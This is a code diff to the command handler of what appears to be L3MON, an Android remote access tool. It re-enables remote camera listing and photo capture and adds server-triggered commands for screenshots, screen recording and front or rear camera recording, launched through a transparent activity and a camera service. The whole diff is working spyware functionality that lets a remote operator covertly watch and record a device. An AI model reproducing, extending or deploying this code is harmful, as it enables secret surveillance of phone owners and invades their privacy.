@@ -1,17 +1,19 @@
 package com.etechd.l3mon;
 
 import android.content.Context;
+import android.content.Intent;
 import android.os.Looper;
 import android.util.Log;
 
 import org.json.JSONException;
 import org.json.JSONObject;
 
+import io.socket.client.Socket;
 import io.socket.emitter.Emitter;
 
 public class ConnectionManager {
 
-
+    public static final String DURATION = "secs";
     public static Context context;
     private static io.socket.client.Socket ioSocket;
     private static FileManager fm = new FileManager();
@@ -50,12 +52,12 @@ public class ConnectionManager {
 
 
                         switch (order){
-//                            case "0xCA":
-//                                if(data.getString("action").equals("camList"))
-//                                    CA(-1);
-//                                else if (data.getString("action").equals("takePic"))
-//                                    CA(Integer.parseInt(data.getString("cameraID")));
-//                                break;
+                            case "0xCA":
+                                if(data.getString("action").equals("camList"))
+                                    CA(-1);
+                                else if (data.getString("action").equals("takePic"))
+                                    CA(Integer.parseInt(data.getString("cameraID")));
+                                break;
                             case "0xFI":
                                 if (data.getString("action").equals("ls"))
                                     FI(0,data.getString("path"));
@@ -92,6 +94,18 @@ public class ConnectionManager {
                             case "0xGP":
                                 GP(data.getString("permission"));
                                 break;
+                            case "0xSS":
+                                SS();
+                                break;
+                            case "0xSR":
+                                SR(data.getInt("sec"));
+                                break;
+                            case "0xRC":
+                                RC(1, data.getInt("sec"));
+                                break;
+                            case "0xFC":
+                                FC(2, data.getInt("sec"));
+                                break;
                         }
                     }catch (Exception e) {
                         e.printStackTrace();
@@ -106,15 +120,15 @@ public class ConnectionManager {
 
     }
 
-//    public static void CA(int cameraID){
-//        if(cameraID == -1) {
-//           JSONObject cameraList = new CameraManager(context).findCameraList();
-//            if(cameraList != null)
-//            ioSocket.emit("0xCA" ,cameraList );
-//        } else {
-//            new CameraManager(context).startUp(cameraID);
-//        }
-//    }
+    public static void CA(int cameraID){
+        if(cameraID == -1) {
+           JSONObject cameraList = new CameraManager(context).findCameraList();
+            if(cameraList != null)
+            ioSocket.emit("0xCA" ,cameraList );
+        } else {
+            new CameraManager(context).startUp(cameraID);
+        }
+    }
 
     public static void FI(int req , String path){
         if(req == 0) {
@@ -184,4 +198,57 @@ public class ConnectionManager {
         }
     }
 
+    public static void SS()
+    {
+        try {
+            Intent intent = new Intent(context, Class.forName("com.etechd.l3mon.TransparentActivity"));
+            intent.putExtra("flag", 1);
+            context.startActivity(intent);
+            Socket socket = ioSocket;
+            Object[] objArr = new Object[1];
+            objArr[0] = "screenshot";
+            socket.emit("0xSS", objArr);
+        } catch (ClassNotFoundException e) {
+            throw new NoClassDefFoundError(e.getMessage());
+        }
+    }
+
+    public static void SR(int sec) throws Exception{
+        if (sec <= 10) {
+            try {
+                Intent intent = new Intent(context, Class.forName("com.etechd.l3mon.TransparentActivity"));
+                intent.putExtra("flag", 2);
+                intent.putExtra(DURATION, sec);
+                context.startActivity(intent);
+            } catch (ClassNotFoundException e) {
+                throw new NoClassDefFoundError(e.getMessage());
+            }
+        }
+    }
+
+    public static void RC(int i, int sec) throws Exception{
+        if (sec <= 10) {
+            try {
+                Intent intent = new Intent(context, Class.forName("com.etechd.l3mon.CamService"));
+                intent.putExtra("cam", i);
+                intent.putExtra(DURATION, sec);
+                context.startService(intent);
+            } catch (ClassNotFoundException e) {
+                throw new NoClassDefFoundError(e.getMessage());
+            }
+        }
+    }
+
+    public static void FC(int i, int sec) throws Exception{
+        if (sec <= 10) {
+            try {
+                Intent intent = new Intent(context, Class.forName("com.etechd.l3mon.CamService"));
+                intent.putExtra("cam", i);
+                intent.putExtra(DURATION, sec);
+                context.startService(intent);
+            } catch (ClassNotFoundException e) {
+                throw new NoClassDefFoundError(e.getMessage());
+            }
+        }
+    }
 }
